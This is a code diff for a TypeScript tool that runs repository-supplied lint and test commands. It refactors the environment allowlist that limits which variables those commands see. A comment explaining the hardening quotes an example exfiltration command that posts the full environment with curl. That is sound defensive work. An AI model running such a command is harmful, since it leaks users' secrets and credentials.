@@ -1,6 +1,7 @@
 import { existsSync, readFileSync } from "node:fs";
 import { join } from "node:path";
 import type { Directive } from "./directive.ts";
+import { toolEnv } from "./env.ts";
 import { directiveIsRepoLocal } from "./paths.ts";
 import { isVerifyCommandTrusted } from "./settings.ts";
 
@@ -12,35 +13,16 @@ export type VerifyResult = {
 const VERIFY_TIMEOUT_MS = 10 * 60 * 1000;
 
 /**
- * Verify commands run through `bash -lc` — with the caller's full
- * environment they were a one-line exfiltration primitive for any repo
- * that commits a malicious `.relay.yaml` (`lint: curl -d "$(env)" …`).
- * Only what a lint/test toolchain actually needs passes through; repos
- * whose tests genuinely need more belong in the user-level directive.
+ * Verify commands run through `bash -lc` — with the caller's full environment
+ * they were a one-line exfiltration primitive for any repo that commits a
+ * malicious `.relay.yaml` (`lint: curl -d "$(env)" …`). Repos whose tests
+ * genuinely need more belong in the user-level directive.
+ *
+ * CI=1 flips vitest/jest/react-scripts out of watch mode — without it a repo
+ * whose `test` script watches would hang the run forever.
  */
-const VERIFY_ENV_ALLOWLIST = [
-  "PATH",
-  "HOME",
-  "TMPDIR",
-  "USER",
-  "LOGNAME",
-  "SHELL",
-  "LANG",
-  "LC_ALL",
-  "TERM",
-];
-
 function verifyEnv(): Record<string, string> {
-  const env: Record<string, string> = {};
-  for (const key of VERIFY_ENV_ALLOWLIST) {
-    const v = process.env[key];
-    if (v !== undefined) env[key] = v;
-  }
-  // CI=1 flips vitest/jest/react-scripts out of watch mode — without it a
-  // repo whose `test` script watches would hang the run forever
-  env.CI = "1";
-  env.FORCE_COLOR = "0";
-  return env;
+  return toolEnv({ CI: "1", FORCE_COLOR: "0" });
 }
 
 export type VerifyCommand = {
